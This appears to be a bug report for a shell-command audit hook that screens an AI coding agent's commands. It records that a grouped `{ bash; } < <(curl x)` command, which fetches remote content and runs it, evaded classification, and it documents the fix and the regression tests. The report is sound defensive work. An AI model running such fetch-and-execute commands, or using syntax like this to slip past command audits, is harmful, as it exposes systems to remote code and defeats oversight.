# agent-audit: a group or subshell with a process-substitution stdin is not flagged

- **Status:** Fixed
- **Reported:** 2026-11-16
- **Severity:** high
- **Environment:** local (Claude Code hooks)
- **Source:** agent run: fix of audit-pipe-into-group-not-flagged, reviewers
- **Related:** [pipe-into-group entry](2026-11-14-audit-pipe-into-group-not-flagged.md)

## Evidence

- `{ bash; } < <(curl x)` gives `['other']`, while `bash < <(x)` is `dynamic_code`.

## Steps to reproduce

1. Classify `{ bash; } < <(curl x)`.
2. Compare with `bash < <(x)`.

## Expected behavior

The group is treated like the simple command: `dynamic_code`.

## Actual behavior

Flags are `['other']`; the command is allowed.

## Root cause

`_stdin_code` read only the simple command's redirects; the compound's `< <(...)` was never looked at.

## Fix

`_Run.compound_procsub_stdin` blocks a compound with `<(...)` on any input fd (`<` or `<>`) whose body reads code with dynamic_code; `_stdin_code` accepts `<>`. Regression tests: `test_command_positions.py` class PipeReceivers.

Fixed on 2026-11-18 (not committed yet). Run: `.claude/runs/bug-audit-pipe-procsub-stdin-family.json`. Suite: 989 tests pass.